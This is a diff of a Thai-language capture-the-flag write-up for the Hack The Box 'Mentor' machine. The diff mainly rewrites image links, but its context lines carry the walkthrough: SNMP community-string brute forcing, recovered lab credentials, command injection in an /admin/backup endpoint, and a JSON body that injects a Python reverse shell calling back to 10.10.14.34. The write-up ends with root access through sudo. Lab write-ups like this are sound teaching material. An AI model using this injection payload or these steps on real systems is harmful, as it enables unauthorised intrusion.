@@ -34,9 +34,9 @@ feroxbuster -u http://api.mentorquotes.htb --no-recursion --methods GET,POST
 
 หากเราตรวจสอบเข้าไปที่ /admin จะพบว่ามี /check กับ /backup อยู่ในนั้นด้วย 
 
-![[Challenge/HTB Challenge/Mentro/IMG/009.png]]
+![](./IMG/009.png)
 
-![[Challenge/HTB Challenge/Mentro/IMG/003.png]]
+![](./IMG/003.png)
 
 
 
@@ -50,7 +50,7 @@ feroxbuster -u http://api.mentorquotes.htb --no-recursion --methods GET,POST
 snmpwalk -v2c -c public 10.10.11.193
 ./snmpbrute.py -t 10.10.11.193
 ```
-![[Challenge/HTB Challenge/Mentro/IMG/001.png]]
+![](./IMG/001.png)
 
 จากข้อมูลด้านบนทำให้เราเห็น community string อีกตัวคือ "internal" ซึ่งเราสามารถใช้ snmp-walk ต่อได้
 
@@ -61,44 +61,44 @@ time snmpwalk -v2c -c internal 10.10.11.193
 time snmpbulkwalk -v2c -c internal 10.10.11.193 ## ไวกว่า 
 ```
 
-![[Challenge/HTB Challenge/Mentro/IMG/002.png]]
+![](./IMG/002.png)
 
 ```credential
 james:kj23sadkj123as0-d213
 ```
 
 จากนั้นทดสอบเข้าด้วยบัญชีผู้ใช้ที่ได้ ตามภาพด้านล่าง จะพบว่าสามารถเข้าใช้งานได้ โดยระบบได้ตอบกลับมาเป็น jwt token 
-![[Challenge/HTB Challenge/Mentro/IMG/004.png]]
+![](./IMG/004.png)
 
 ทดสอบใส่ jwt token ไปที่ /users เพื่อตรวจสอบ users ภายในระบบ จะพบว่ามี 2 users 
-![[Challenge/HTB Challenge/Mentro/IMG/005.png]]
+![](./IMG/005.png)
 เราสามารถตรวจสอบ users ได้โดยใส่ user id ของแต่ละคน
-![[Challenge/HTB Challenge/Mentro/IMG/006.png]]
+![](./IMG/006.png)
 
 จากนั้นทดสอบการทำงานของ /quotes/ เราจะเริ่มได้ข้อมูลของบทความต่างๆ 
 
-![[Challenge/HTB Challenge/Mentro/IMG/007.png]]
+![](./IMG/007.png)
 
 หากทดสอบหน้า admin เราจะไม่สามารถเข้าถึงได้ อีกทั้งใน Swagger doc ยังไม่มีการเขียนไว้
 
-![[Challenge/HTB Challenge/Mentro/IMG/008.png]]
+![](./IMG/008.png)
 
 ทดสอบ POST ไปที่ /admin/backup จะพบว่ามีการตอบกลับมา
-![[Challenge/HTB Challenge/Mentro/IMG/011.png]]
+![](./IMG/011.png)
 โดยจากข้อมูลได้ระบุว่าให้เราใส่ body ไปด้วย (path) โดยหากทดสอบใส่ parameter เข้าไปจะพบว่ามีการตอบกลับมาว่า Done
 
-![[Challenge/HTB Challenge/Mentro/IMG/012.png]]
+![](./IMG/012.png)
 
 ## Command Injection 
 ทดสอบ Command Injection ไปในนั้น 
-![[Challenge/HTB Challenge/Mentro/IMG/015.png]]
+![](./IMG/015.png)
 
 ฝั่ง kali linux จะทำการรับด้วย tcpdump 
 ```bash
 sudo tcpdump -ni tun0 icmp
 ```
 
-![[Challenge/HTB Challenge/Mentro/IMG/014.png]]
+![](./IMG/014.png)
 
 ## Shell as svc 
 
@@ -106,7 +106,7 @@ sudo tcpdump -ni tun0 icmp
 {"path": ";python -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.34\",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")';"}
 ```
 
-![[Challenge/HTB Challenge/Mentro/IMG/016.png]]
+![](./IMG/016.png)
 
 ## Chisel Tunnel 
 
@@ -160,7 +160,7 @@ mentorquotes_db=#
 
 ## MD5 Crack 
 
-![[Challenge/HTB Challenge/Mentro/IMG/017.png]]
+![](./IMG/017.png)
 
 
 svc:123meunomeeivani
@@ -190,6 +190,6 @@ access AllGroup "" any noauth exact AllView none none
 ```
 
 เราสามารถนำ credential login ด้วย james ได้ และหาก sudo -l ก้อจะเห็นได้ว่าสามารถใช้ /bin/sh ด้วยสิทธิ root ได้เลย 
-![[Challenge/HTB Challenge/Mentro/IMG/018.png]]
+![](./IMG/018.png)
 
 # PWNED 
